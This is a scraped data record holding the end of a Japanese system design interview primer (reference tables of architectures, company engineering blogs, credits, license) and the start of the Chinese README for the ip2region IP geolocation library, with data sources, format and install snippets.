[facebook.com](https:\/\/www.facebook.com\/note.php?note_id=10150468255628920)<br\/>[highscalability.com](http:\/\/highscalability.com\/blog\/2012\/1\/23\/facebook-timeline-brought-to-you-by-the-power-of-denormaliza.html) |\n| Facebook\u30c1\u30e3\u30c3\u30c8\u306e\u8a2d\u8a08 | [erlang-factory.com](http:\/\/www.erlang-factory.com\/upload\/presentations\/31\/EugeneLetuchy-ErlangatFacebook.pdf)<br\/>[facebook.com](https:\/\/www.facebook.com\/note.php?note_id=14218138919&id=9445547199&index=0) |\n| Facebook\u306e\u3088\u3046\u306agraph\u691c\u7d22\u306e\u8a2d\u8a08 | [facebook.com](https:\/\/www.facebook.com\/notes\/facebook-engineering\/under-the-hood-building-out-the-infrastructure-for-graph-search\/10151347573598920)<br\/>[facebook.com](https:\/\/www.facebook.com\/notes\/facebook-engineering\/under-the-hood-indexing-and-ranking-in-graph-search\/10151361720763920)<br\/>[facebook.com](https:\/\/www.facebook.com\/notes\/facebook-engineering\/under-the-hood-the-natural-language-interface-of-graph-search\/10151432733048920) |\n| CloudFlare\u306e\u3088\u3046\u306aCDN\u306e\u8a2d\u8a08 | [cmu.edu](http:\/\/repository.cmu.edu\/cgi\/viewcontent.cgi?article=2112&context=compsci) |\n| Twitter\u306e\u30c8\u30ec\u30f3\u30c9\u6a5f\u80fd\u306e\u8a2d\u8a08 | [michael-noll.com](http:\/\/www.michael-noll.com\/blog\/2013\/01\/18\/implementing-real-time-trending-topics-in-storm\/)<br\/>[snikolov .wordpress.com](http:\/\/snikolov.wordpress.com\/2012\/11\/14\/early-detection-of-twitter-trends\/) |\n| \u30e9\u30f3\u30c0\u30e0ID\u767a\u884c\u30b7\u30b9\u30c6\u30e0\u306e\u8a2d\u8a08 | [blog.twitter.com](https:\/\/blog.twitter.com\/2010\/announcing-snowflake)<br\/>[github.com](https:\/\/github.com\/twitter\/snowflake\/) |\n| \u4e00\u5b9a\u306e\u30a4\u30f3\u30bf\u30fc\u30d0\u30eb\u6642\u9593\u3067\u306e\u4e0a\u4f4dk\u4ef6\u3092\u8fd4\u3059 | [ucsb.edu](https:\/\/icmi.cs.ucsb.edu\/research\/tech_reports\/reports\/2005-23.pdf)<br\/>[wpi.edu](http:\/\/davis.wpi.edu\/xmdv\/docs\/EDBT11-diyang.pdf) |\n| \u8907\u6570\u306e\u30c7\u30fc\u30bf\u30bb\u30f3\u30bf\u30fc\u304b\u3089\u30c7\u30fc\u30bf\u3092\u914d\u4fe1\u3059\u308b\u30b5\u30fc\u30d3\u30b9\u306e\u8a2d\u8a08 | [highscalability.com](http:\/\/highscalability.com\/blog\/2009\/8\/24\/how-google-serves-data-from-multiple-datacenters.html) |\n| \u30aa\u30f3\u30e9\u30a4\u30f3\u306e\u8907\u6570\u30d7\u30ec\u30a4\u30e4\u30fc\u30ab\u30fc\u30c9\u30b2\u30fc\u30e0\u306e\u8a2d\u8a08 | [indieflashblog.com](http:\/\/www.indieflashblog.com\/how-to-create-an-asynchronous-multiplayer-game.html)<br\/>[buildnewgames.com](http:\/\/buildnewgames.com\/real-time-multiplayer\/) |\n| \u30ac\u30fc\u30d9\u30c3\u30b8\u30b3\u30ec\u30af\u30b7\u30e7\u30f3\u30b7\u30b9\u30c6\u30e0\u306e\u8a2d\u8a08 | [stuffwithstuff.com](http:\/\/journal.stuffwithstuff.com\/2013\/12\/08\/babys-first-garbage-collector\/)<br\/>[washington.edu](http:\/\/courses.cs.washington.edu\/courses\/csep521\/07wi\/prj\/rick.pdf) |\n| \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u4f8b\u984c\u3092\u8ffd\u52a0\u3059\u308b | [Contribute](#contributing) |\n\n### \u5b9f\u4e16\u754c\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\n\n> \u4e16\u306e\u4e2d\u306e\u30b7\u30b9\u30c6\u30e0\u304c\u3069\u306e\u3088\u3046\u306b\u8a2d\u8a08\u3055\u308c\u3066\u3044\u308b\u304b\u306b\u3064\u3044\u3066\u306e\u8a18\u4e8b\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/TcUo2fw.png\"\/>\n  <br\/>\n  <i><a href=https:\/\/www.infoq.com\/presentations\/Twitter-Timeline-Scalability>Source: Twitter timelines at scale<\/a><\/i>\n<\/p>\n\n**\u4ee5\u4e0b\u306e\u8a18\u4e8b\u306e\u91cd\u7bb1\u306e\u9685\u3092\u3064\u3064\u304f\u3088\u3046\u306a\u7d30\u304b\u3044\u8a73\u7d30\u306b\u3053\u3060\u308f\u3089\u306a\u3044\u3053\u3068\u3002\u3080\u3057\u308d**\n\n* \u5171\u901a\u306e\u539f\u7406\u3001\u6280\u8853\u3001\u30d1\u30bf\u30fc\u30f3\u3092\u63a2\u308b\u3053\u3068\n* \u305d\u308c\u305e\u308c\u306e\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3067\u3069\u3093\u306a\u554f\u984c\u304c\u89e3\u6c7a\u3055\u308c\u3001\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u306f\u3069\u3053\u3067\u3046\u307e\u304f\u4f7f\u3048\u3082\u3057\u304f\u306f\u4f7f\u3048\u306a\u3044\u304b\u3092\u77e5\u308b\u3053\u3068\n* \u5b66\u3093\u3060\u3053\u3068\u3092\u5fa9\u7fd2\u3059\u308b\u3053\u3068\n\n|\u7a2e\u985e | \u30b7\u30b9\u30c6\u30e0 | \u53c2\u8003\u30da\u30fc\u30b8 |\n|---|---|---|\n| \u30c7\u30fc\u30bf\u51e6\u7406 | **MapReduce** - Google\u306e\u5206\u6563\u30c7\u30fc\u30bf\u51e6\u7406\u30b7\u30b9\u30c6\u30e0 | [research.google.com](http:\/\/static.googleusercontent.com\/media\/research.google.com\/zh-CN\/us\/archive\/mapreduce-osdi04.pdf) |\n| \u30c7\u30fc\u30bf\u51e6\u7406 | **Spark** - Databricks\u306e\u5206\u6563\u30c7\u30fc\u30bf\u51e6\u7406\u30b7\u30b9\u30c6\u30e0 | [slideshare.net](http:\/\/www.slideshare.net\/AGrishchenko\/apache-spark-architecture) |\n| \u30c7\u30fc\u30bf\u51e6\u7406 | **Storm** - Twitter\u306e\u5206\u6563\u30c7\u30fc\u30bf\u51e6\u7406\u30b7\u30b9\u30c6\u30e0 | [slideshare.net](http:\/\/www.slideshare.net\/previa\/storm-16094009) |\n| | | |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **Bigtable** - Google\u306e\u30ab\u30e9\u30e0\u6307\u5411\u5206\u6563\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9 | [harvard.edu](http:\/\/www.read.seas.harvard.edu\/~kohler\/class\/cs239-w08\/chang06bigtable.pdf) |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **HBase** - Bigtable\u306e\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u5b9f\u88c5 | [slideshare.net](http:\/\/www.slideshare.net\/alexbaranau\/intro-to-hbase) |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **Cassandra** - Facebook\u306e\u30ab\u30e9\u30e0\u6307\u5411\u5206\u6563\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9 | [slideshare.net](http:\/\/www.slideshare.net\/planetcassandra\/cassandra-introduction-features-30103666)\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **DynamoDB** - Amazon\u306e\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u6307\u5411\u5206\u6563\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9 | [harvard.edu](http:\/\/www.read.seas.harvard.edu\/~kohler\/class\/cs239-w08\/decandia07dynamo.pdf) |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **MongoDB** - \u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u6307\u5411\u5206\u6563\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9 | [slideshare.net](http:\/\/www.slideshare.net\/mdirolf\/introduction-to-mongodb) |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **Spanner** - Google\u306e\u30b0\u30ed\u30fc\u30d0\u30eb\u5206\u6563\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9 | [research.google.com](http:\/\/research.google.com\/archive\/spanner-osdi2012.pdf) |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **Memcached** - \u5206\u6563\u30e1\u30e2\u30ea\u30fc\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u30b7\u30b9\u30c6\u30e0 | [slideshare.net](http:\/\/www.slideshare.net\/oemebamo\/introduction-to-memcached) |\n| \u30c7\u30fc\u30bf\u30b9\u30c8\u30a2 | **Redis** - \u6c38\u7d9a\u6027\u3068\u30d0\u30ea\u30e5\u30fc\u30bf\u30a4\u30d7\u3092\u517c\u306d\u5099\u3048\u305f\u5206\u6563\u30e1\u30e2\u30ea\u30fc\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u30b7\u30b9\u30c6\u30e0 | [slideshare.net](http:\/\/www.slideshare.net\/dvirsky\/introduction-to-redis) |\n| | | |\n| \u30d5\u30a1\u30a4\u30eb\u30b7\u30b9\u30c6\u30e0 | **Google File System (GFS)** - \u5206\u6563\u30d5\u30a1\u30a4\u30eb\u30b7\u30b9\u30c6\u30e0 | [research.google.com](http:\/\/static.googleusercontent.com\/media\/research.google.com\/zh-CN\/us\/archive\/gfs-sosp2003.pdf) |\n| \u30d5\u30a1\u30a4\u30eb\u30b7\u30b9\u30c6\u30e0 | **Hadoop File System (HDFS)** - GFS\u306e\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u5b9f\u88c5 | [apache.org](https:\/\/hadoop.apache.org\/docs\/r1.2.1\/hdfs_design.html) |\n| | | |\n| Misc | **Chubby** - \u758e\u7d50\u5408\u306e\u5206\u6563\u30b7\u30b9\u30c6\u30e0\u3092\u30ed\u30c3\u30af\u3059\u308bGoogle\u306e\u30b5\u30fc\u30d3\u30b9 | [research.google.com](http:\/\/static.googleusercontent.com\/external_content\/untrusted_dlcp\/research.google.com\/en\/us\/archive\/chubby-osdi06.pdf) |\n| Misc | **Dapper** - \u5206\u6563\u30b7\u30b9\u30c6\u30e0\u3092\u8ffd\u8de1\u3059\u308b\u30a4\u30f3\u30d5\u30e9 | [research.google.com](http:\/\/static.googleusercontent.com\/media\/research.google.com\/en\/\/pubs\/archive\/36356.pdf)\n| Misc | **Kafka** - LinkedIn\u306b\u3088\u308bPub\/sub\u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc | [slideshare.net](http:\/\/www.slideshare.net\/mumrah\/kafka-talk-tri-hug) |\n| Misc | **Zookeeper** - \u540c\u671f\u3092\u53ef\u80fd\u306b\u3059\u308b\u4e2d\u592e\u96c6\u6a29\u30a4\u30f3\u30d5\u30e9\u3068\u30b5\u30fc\u30d3\u30b9 | [slideshare.net](http:\/\/www.slideshare.net\/sauravhaloi\/introduction-to-apache-zookeeper) |\n| | \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u3092\u8ffd\u52a0\u3059\u308b | [Contribute](#contributing) |\n\n### \u5404\u4f01\u696d\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\n\n| \u4f01\u696d | \u53c2\u8003\u30da\u30fc\u30b8 |\n|---|---|\n| Amazon | [Amazon architecture](http:\/\/highscalability.com\/amazon-architecture) |\n| Cinchcast | [Producing 1,500 hours of audio every day](http:\/\/highscalability.com\/blog\/2012\/7\/16\/cinchcast-architecture-producing-1500-hours-of-audio-every-d.html) |\n| DataSift | [Realtime datamining At 120,000 tweets per second](http:\/\/highscalability.com\/blog\/2011\/11\/29\/datasift-architecture-realtime-datamining-at-120000-tweets-p.html) |\n| DropBox | [How we've scaled Dropbox](https:\/\/www.youtube.com\/watch?v=PE4gwstWhmc) |\n| ESPN | [Operating At 100,000 duh nuh nuhs per second](http:\/\/highscalability.com\/blog\/2013\/11\/4\/espns-architecture-at-scale-operating-at-100000-duh-nuh-nuhs.html) |\n| Google | [Google architecture](http:\/\/highscalability.com\/google-architecture) |\n| Instagram | [14 million users, terabytes of photos](http:\/\/highscalability.com\/blog\/2011\/12\/6\/instagram-architecture-14-million-users-terabytes-of-photos.html)<br\/>[What powers Instagram](http:\/\/instagram-engineering.tumblr.com\/post\/13649370142\/what-powers-instagram-hundreds-of-instances) |\n| Justin.tv | [Justin.Tv's live video broadcasting architecture](http:\/\/highscalability.com\/blog\/2010\/3\/16\/justintvs-live-video-broadcasting-architecture.html) |\n| Facebook | [Scaling memcached at Facebook](https:\/\/cs.uwaterloo.ca\/~brecht\/courses\/854-Emerging-2014\/readings\/key-value\/fb-memcached-nsdi-2013.pdf)<br\/>[TAO: Facebook\u2019s distributed data store for the social graph](https:\/\/cs.uwaterloo.ca\/~brecht\/courses\/854-Emerging-2014\/readings\/data-store\/tao-facebook-distributed-datastore-atc-2013.pdf)<br\/>[Facebook\u2019s photo storage](https:\/\/www.usenix.org\/legacy\/event\/osdi10\/tech\/full_papers\/Beaver.pdf) |\n| Flickr | [Flickr architecture](http:\/\/highscalability.com\/flickr-architecture) |\n| Mailbox | [From 0 to one million users in 6 weeks](http:\/\/highscalability.com\/blog\/2013\/6\/18\/scaling-mailbox-from-0-to-one-million-users-in-6-weeks-and-1.html) |\n| Pinterest | [From 0 To 10s of billions of page views a month](http:\/\/highscalability.com\/blog\/2013\/4\/15\/scaling-pinterest-from-0-to-10s-of-billions-of-page-views-a.html)<br\/>[18 million visitors, 10x growth, 12 employees](http:\/\/highscalability.com\/blog\/2012\/5\/21\/pinterest-architecture-update-18-million-visitors-10x-growth.html) |\n| Playfish | [50 million monthly users and growing](http:\/\/highscalability.com\/blog\/2010\/9\/21\/playfishs-social-gaming-architecture-50-million-monthly-user.html) |\n| PlentyOfFish | [PlentyOfFish architecture](http:\/\/highscalability.com\/plentyoffish-architecture) |\n| Salesforce | [How they handle 1.3 billion transactions a day](http:\/\/highscalability.com\/blog\/2013\/9\/23\/salesforce-architecture-how-they-handle-13-billion-transacti.html) |\n| Stack Overflow | [Stack Overflow architecture](http:\/\/highscalability.com\/blog\/2009\/8\/5\/stack-overflow-architecture.html) |\n| TripAdvisor | [40M visitors, 200M dynamic page views, 30TB data](http:\/\/highscalability.com\/blog\/2011\/6\/27\/tripadvisor-architecture-40m-visitors-200m-dynamic-page-view.html) |\n| Tumblr | [15 billion page views a month](http:\/\/highscalability.com\/blog\/2012\/2\/13\/tumblr-architecture-15-billion-page-views-a-month-and-harder.html) |\n| Twitter | [Making Twitter 10000 percent faster](http:\/\/highscalability.com\/scaling-twitter-making-twitter-10000-percent-faster)<br\/>[Storing 250 million tweets a day using MySQL](http:\/\/highscalability.com\/blog\/2011\/12\/19\/how-twitter-stores-250-million-tweets-a-day-using-mysql.html)<br\/>[150M active users, 300K QPS, a 22 MB\/S firehose](http:\/\/highscalability.com\/blog\/2013\/7\/8\/the-architecture-twitter-uses-to-deal-with-150m-active-users.html)<br\/>[Timelines at scale](https:\/\/www.infoq.com\/presentations\/Twitter-Timeline-Scalability)<br\/>[Big and small data at Twitter](https:\/\/www.youtube.com\/watch?v=5cKTP36HVgI)<br\/>[Operations at Twitter: scaling beyond 100 million users](https:\/\/www.youtube.com\/watch?v=z8LU0Cj6BOU) |\n| Uber | [How Uber scales their real-time market platform](http:\/\/highscalability.com\/blog\/2015\/9\/14\/how-uber-scales-their-real-time-market-platform.html) |\n| WhatsApp | [The WhatsApp architecture Facebook bought for $19 billion](http:\/\/highscalability.com\/blog\/2014\/2\/26\/the-whatsapp-architecture-facebook-bought-for-19-billion.html) |\n| YouTube | [YouTube scalability](https:\/\/www.youtube.com\/watch?v=w5WVu624fY8)<br\/>[YouTube architecture](http:\/\/highscalability.com\/youtube-architecture) |\n\n### \u4f01\u696d\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u30d6\u30ed\u30b0\n\n> \u9762\u63a5\u3092\u53d7\u3051\u308b\u4f01\u696d\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\n>\n> \u6295\u3052\u3089\u308c\u308b\u8cea\u554f\u306f\u540c\u3058\u5206\u91ce\u304b\u3089\u6765\u308b\u3053\u3068\u3082\u3042\u308b\u3067\u3057\u3087\u3046\n\n* [Airbnb Engineering](http:\/\/nerds.airbnb.com\/)\n* [Atlassian Developers](https:\/\/developer.atlassian.com\/blog\/)\n* [Autodesk Engineering](http:\/\/cloudengineering.autodesk.com\/blog\/)\n* [AWS Blog](https:\/\/aws.amazon.com\/blogs\/aws\/)\n* [Bitly Engineering Blog](http:\/\/word.bitly.com\/)\n* [Box Blogs](https:\/\/www.box.com\/blog\/engineering\/)\n* [Cloudera Developer Blog](http:\/\/blog.cloudera.com\/blog\/)\n* [Dropbox Tech Blog](https:\/\/tech.dropbox.com\/)\n* [Engineering at Quora](http:\/\/engineering.quora.com\/)\n* [Ebay Tech Blog](http:\/\/www.ebaytechblog.com\/)\n* [Evernote Tech Blog](https:\/\/blog.evernote.com\/tech\/)\n* [Etsy Code as Craft](http:\/\/codeascraft.com\/)\n* [Facebook Engineering](https:\/\/www.facebook.com\/Engineering)\n* [Flickr Code](http:\/\/code.flickr.net\/)\n* [Foursquare Engineering Blog](http:\/\/engineering.foursquare.com\/)\n* [GitHub Engineering Blog](http:\/\/githubengineering.com\/)\n* [Google Research Blog](http:\/\/googleresearch.blogspot.com\/)\n* [Groupon Engineering Blog](https:\/\/engineering.groupon.com\/)\n* [Heroku Engineering Blog](https:\/\/engineering.heroku.com\/)\n* [Hubspot Engineering Blog](http:\/\/product.hubspot.com\/blog\/topic\/engineering)\n* [High Scalability](http:\/\/highscalability.com\/)\n* [Instagram Engineering](http:\/\/instagram-engineering.tumblr.com\/)\n* [Intel Software Blog](https:\/\/software.intel.com\/en-us\/blogs\/)\n* [Jane Street Tech Blog](https:\/\/blogs.janestreet.com\/category\/ocaml\/)\n* [LinkedIn Engineering](http:\/\/engineering.linkedin.com\/blog)\n* [Microsoft Engineering](https:\/\/engineering.microsoft.com\/)\n* [Microsoft Python Engineering](https:\/\/blogs.msdn.microsoft.com\/pythonengineering\/)\n* [Netflix Tech Blog](http:\/\/techblog.netflix.com\/)\n* [Paypal Developer Blog](https:\/\/devblog.paypal.com\/category\/engineering\/)\n* [Pinterest Engineering Blog](http:\/\/engineering.pinterest.com\/)\n* [Quora Engineering](https:\/\/engineering.quora.com\/)\n* [Reddit Blog](http:\/\/www.redditblog.com\/)\n* [Salesforce Engineering Blog](https:\/\/developer.salesforce.com\/blogs\/engineering\/)\n* [Slack Engineering Blog](https:\/\/slack.engineering\/)\n* [Spotify Labs](https:\/\/labs.spotify.com\/)\n* [Twilio Engineering Blog](http:\/\/www.twilio.com\/engineering)\n* [Twitter Engineering](https:\/\/engineering.twitter.com\/)\n* [Uber Engineering Blog](http:\/\/eng.uber.com\/)\n* [Yahoo Engineering Blog](http:\/\/yahooeng.tumblr.com\/)\n* [Yelp Engineering Blog](http:\/\/engineeringblog.yelp.com\/)\n* [Zynga Engineering Blog](https:\/\/www.zynga.com\/blogs\/engineering)\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:\n\n* [kilimchoi\/engineering-blogs](https:\/\/github.com\/kilimchoi\/engineering-blogs)\n\n\u3053\u3053\u306b\u3042\u308b\u30ea\u30b9\u30c8\u306f\u6bd4\u8f03\u7684\u5c0f\u898f\u6a21\u306a\u3082\u306e\u306b\u3068\u3069\u3081\u3001[kilimchoi\/engineering-blogs](https:\/\/github.com\/kilimchoi\/engineering-blogs)\u306b\u3088\u308a\u8a73\u7d30\u306b\u8a18\u3059\u3053\u3068\u3067\u91cd\u8907\u3057\u306a\u3044\u3088\u3046\u306b\u3057\u3066\u304a\u304f\u3053\u3068\u306b\u3059\u308b\u3002\u30a8\u30f3\u30b8\u30cb\u30a2\u30d6\u30ed\u30b0\u3078\u306e\u30ea\u30f3\u30af\u3092\u8ffd\u52a0\u3059\u308b\u5834\u5408\u306f\u3053\u3053\u3067\u306f\u306a\u304f\u3001engineering-blogs\u30ec\u30dc\u30b8\u30c8\u30ea\u306b\u8ffd\u52a0\u3059\u308b\u3053\u3068\u3092\u691c\u8a0e\u3057\u3066\u304f\u3060\u3055\u3044\u3002\n\n## \u9032\u884c\u4e2d\u306e\u4f5c\u696d\n\n\u30bb\u30af\u30b7\u30e7\u30f3\u306e\u8ffd\u52a0\u3084\u3001\u9032\u884c\u4e2d\u306e\u4f5c\u696d\u3092\u624b\u4f1d\u3063\u3066\u3044\u305f\u3060\u3051\u308b\u5834\u5408\u306f[\u3053\u3061\u3089](#contributing)!\n\n* MapReduce\u306b\u3088\u308b\u5206\u6563\u30b3\u30f3\u30d4\u30e5\u30fc\u30c6\u30a3\u30f3\u30b0\n* Consistent hashing\n* Scatter gather\n* [Contribute](#contributing)\n\n## \u30af\u30ec\u30b8\u30c3\u30c8\n\n\u30af\u30ec\u30b8\u30c3\u30c8\u53ca\u3073\u3001\u53c2\u7167\u30da\u30fc\u30b8\u306f\u9069\u6642\u3053\u306e\u30ea\u30dd\u30b8\u30c8\u30ea\u5185\u306b\u8a18\u8f09\u3057\u3066\u3042\u308a\u307e\u3059\n\nSpecial thanks to:\n\n* [Hired in tech](http:\/\/www.hiredintech.com\/system-design\/the-system-design-process\/)\n* [Cracking the coding interview](https:\/\/www.amazon.com\/dp\/0984782850\/)\n* [High scalability](http:\/\/highscalability.com\/)\n* [checkcheckzz\/system-design-interview](https:\/\/github.com\/checkcheckzz\/system-design-interview)\n* [shashank88\/system_design](https:\/\/github.com\/shashank88\/system_design)\n* [mmcgrana\/services-engineering](https:\/\/github.com\/mmcgrana\/services-engineering)\n* [System design cheat sheet](https:\/\/gist.github.com\/vasanthk\/485d1c25737e8e72759f)\n* [A distributed systems reading list](http:\/\/dancres.github.io\/Pages\/)\n* [Cracking the system design interview](http:\/\/www.puncsky.com\/blog\/2016-02-13-crack-the-system-design-interview)\n\n## Contact info\n\nFeel free to contact me to discuss any issues, questions, or comments.\n\nMy contact info can be found on my [GitHub page](https:\/\/github.com\/donnemartin).\n\n## License\n\n*I am providing code and resources in this repository to you under an open source license.  Because this is my personal repository, the license you receive to my code and resources is from me and not my employer (Facebook).*\n\n    Copyright 2017 Donne Martin\n\n    Creative Commons Attribution 4.0 International License (CC BY 4.0)\n\n    http:\/\/creativecommons.org\/licenses\/by\/4.0\/\n"},{"repo":"\/lionsoul2014\/ip2region","language":"Java","readme_contents":"ip2region - \u6700\u81ea\u7531\u7684ip\u5730\u5740\u67e5\u8be2\u5e93\uff0cip\u5230\u5730\u533a\u7684\u6620\u5c04\u5e93\uff0c\u63d0\u4f9bBinary,B\u6811\u548c\u7eaf\u5185\u5b58\u4e09\u79cd\u67e5\u8be2\u7b97\u6cd5\uff0c\u5988\u5988\u518d\u4e5f\u4e0d\u7528\u62c5\u5fc3\u6211\u7684ip\u5730\u5740\u5b9a\u4f4d\u3002\r\n\r\n### 1. \u524d\u8a00\uff1a\r\nip2region\u91cd\u70b9\u5728\u4e8e<b>\u7814\u7a76ip\u6570\u636e\u7684\u5b58\u50a8\u8bbe\u8ba1\u548c\u5404\u79cd\u8bed\u8a00\u7684\u67e5\u8be2\u5b9e\u73b0<\/b>\uff0c\u5e76\u6ca1\u6709\u539f\u59cbip\u6570\u636e\u7684\u652f\u6491\uff0c\u6570\u636e\u6765\u6e90\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u63cf\u8ff0\uff0c\u5347\u7ea7\u6570\u636e\u9700\u8981\u5f88\u591aIP\u7684\u652f\u6491\u5e76\u4e14\u4f1a\u5bf9\u539f\u59cb\u5e73\u53f0\u9020\u6210\u4e00\u5b9a\u91cf\u7684\u8bf7\u6c42\u538b\u529b\uff0c\u672c\u9879\u76ee\u4e0d\u4fdd\u8bc1\u53ca\u65f6\u7684\u6570\u636e\u66f4\u65b0\uff0c\u6ca1\u6709\u4e5f\u4e0d\u4f1a\u6709\u5546\u7528\u7248\u672c\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u6570\u636e\u5bfc\u5165ip2region\u8fdb\u884c\u81ea\u5b9a\u4e49\u67e5\u8be2\u7684\u5b9e\u73b0\u3002\r\n\r\n### 2. 99.9%\u51c6\u786e\u7387\uff0c\u5b9a\u65f6\u66f4\u65b0\uff1a\r\n\r\n\u6570\u636e\u805a\u5408\u4e86\u4e00\u4e9b\u77e5\u540dip\u5230\u5730\u540d\u67e5\u8be2\u63d0\u4f9b\u5546\u7684\u6570\u636e\uff0c\u8fd9\u4e9b\u662f\u4ed6\u4eec\u5b98\u65b9\u7684\u7684\u51c6\u786e\u7387\uff0c\u7ecf\u6d4b\u8bd5\u7740\u5b9e\u6bd4\u7eaf\u771f\u5565\u7684\u51c6\u786e\u4e00\u4e9b\u3002<br \/>\r\nip2region\u7684\u6570\u636e\u805a\u5408\u81ea\u4ee5\u4e0b\u670d\u52a1\u5546\u7684\u5f00\u653eAPI\u6216\u8005\u6570\u636e(\u5347\u7ea7\u7a0b\u5e8f\u6bcf\u79d2\u8bf7\u6c42\u6b21\u65702\u52304\u6b21): <br \/>\r\n01, &gt;80%, \u6dd8\u5b9dIP\u5730\u5740\u5e93, [http:\/\/ip.taobao.com\/](http:\/\/ip.taobao.com\/) <br \/>\r\n02, \u224810%, GeoIP, [https:\/\/geoip.com\/](https:\/\/geoip.com\/) <br \/>\r\n03, \u22482%, \u7eaf\u771fIP\u5e93, [http:\/\/www.cz88.net\/](http:\/\/www.cz88.net\/) <br \/>\r\n<b>\u5907\u6ce8\uff1a<\/b>\u5982\u679c\u4e0a\u8ff0\u5f00\u653eAPI\u6216\u8005\u6570\u636e\u90fd\u4e0d\u7ed9\u5f00\u653e\u6570\u636e\u65f6ip2region\u5c06\u505c\u6b62\u6570\u636e\u7684\u66f4\u65b0\u670d\u52a1\u3002\r\n\r\n\r\n### 3. \u6807\u51c6\u5316\u7684\u6570\u636e\u683c\u5f0f\uff1a\r\n\r\n\u6bcf\u6761ip\u6570\u636e\u6bb5\u90fd\u56fa\u5b9a\u4e86\u683c\u5f0f\uff1a_\u57ce\u5e02Id|\u56fd\u5bb6|\u533a\u57df|\u7701\u4efd|\u57ce\u5e02|ISP_\r\n\r\n\u53ea\u6709\u4e2d\u56fd\u7684\u6570\u636e\u7cbe\u786e\u5230\u4e86\u57ce\u5e02\uff0c\u5176\u4ed6\u56fd\u5bb6\u53ea\u80fd\u5b9a\u4f4d\u5230\u56fd\u5bb6\uff0c\u540e\u524d\u7684\u9009\u9879\u5168\u90e8\u662f0\uff0c\u5df2\u7ecf\u5305\u542b\u4e86\u5168\u90e8\u4f60\u80fd\u67e5\u5230\u7684\u5927\u5927\u5c0f\u5c0f\u7684\u56fd\u5bb6\u3002\r\n\uff08\u8bf7\u5ffd\u7565\u524d\u9762\u7684\u57ce\u5e02Id\uff0c\u4e2a\u4eba\u9879\u76ee\u9700\u6c42\uff09\r\n\r\n### 4. \u4f53\u79ef\u5c0f\uff1a\r\n\r\n\u751f\u6210\u7684\u6570\u636e\u5e93\u6587\u4ef6ip2region.db\u53ea\u67091.5M\uff081.2\u7248\u672c\u524d\u662f3.5M\uff09\r\n\r\n### 5. \u591a\u67e5\u8be2\u5ba2\u6237\u7aef\u7684\u652f\u6301\uff0c0.0x\u6beb\u79d2\u7ea7\u522b\u7684\u67e5\u8be2\r\n\r\n\u5df2\u7ecf\u96c6\u6210\u7684\u5ba2\u6237\u7aef\u6709\uff1ajava\u3001C#\u3001php\u3001c\u3001python\u3001nodejs\u3001php\u6269\u5c55(php5\u548cphp7)\u3001golang\u3001rust\u3001lua\u3001lua_c\u3002\r\n\r\n    \u63d0\u4f9b\u4e86\u4e24\u79cd\u67e5\u8be2\u7b97\u6cd5\uff0c\u54cd\u5e94\u65f6\u95f4\u5982\u4e0b\uff1a\r\n    \u5ba2\u6237\u7aef\/binary\u7b97\u6cd5\/b-tree\u7b97\u6cd5\/Memory\u7b97\u6cd5\uff1a\r\n    c#\/0.x\u6beb\u79d2\/0.x\u6beb\u79d2\/0.x\u6beb\u79d2\r\n    java\/0.x\u6beb\u79d2\/0.x\u6beb\u79d2\/0.1x\u6beb\u79d2 (\u4f7f\u7528RandomAccessFile)\r\n    php\/0.x\u6beb\u79d2\/0.1x\u6beb\u79d2\/0.1x\u6beb\u79d2\r\n    c\/0.0x\u6beb\u79d2\/0.0x\u6beb\u79d2\/0.00x\u6beb\u79d2(b-tree\u7b97\u6cd5\u57fa\u672c\u7a33\u5b9a\u57280.02x\u6beb\u79d2\u7ea7\u522b)\r\n    python\/0.x\u6beb\u79d2\/0.1x\u6beb\u79d2\/\u672a\u77e5\r\n    lua\/0.x\u6beb\u79d2\/0.x\u6beb\u79d2\/0.x\u6beb\u79d2\r\n    lua_c\/0.0x\u6beb\u79d2\/0.0x\u6beb\u79d2\/0.00x\u6beb\u79d2\r\n\r\n\u4efb\u4f55\u5ba2\u6237\u7aefb-tree\u90fd\u6bd4binary\u7b97\u6cd5\u5feb\uff0c\u5f53\u7136Memory\u7b97\u6cd5\u56fa\u7136\u662f\u6700\u5feb\u7684\uff01\r\n\r\nmaven\u4ed3\u5e93\u5730\u5740\uff1a\r\n```xml\r\n<dependency>\r\n    <groupId>org.lionsoul<\/groupId>\r\n    <artifactId>ip2region<\/artifactId>\r\n    <version>1.7.2<\/version>\r\n<\/dependency>\r\n```\r\nnuget\u5b89\u88c5\u547d\u4ee4\r\n```shell\r\nInstall-Package IP2Region\r\n```\r\n\r\n### 6. 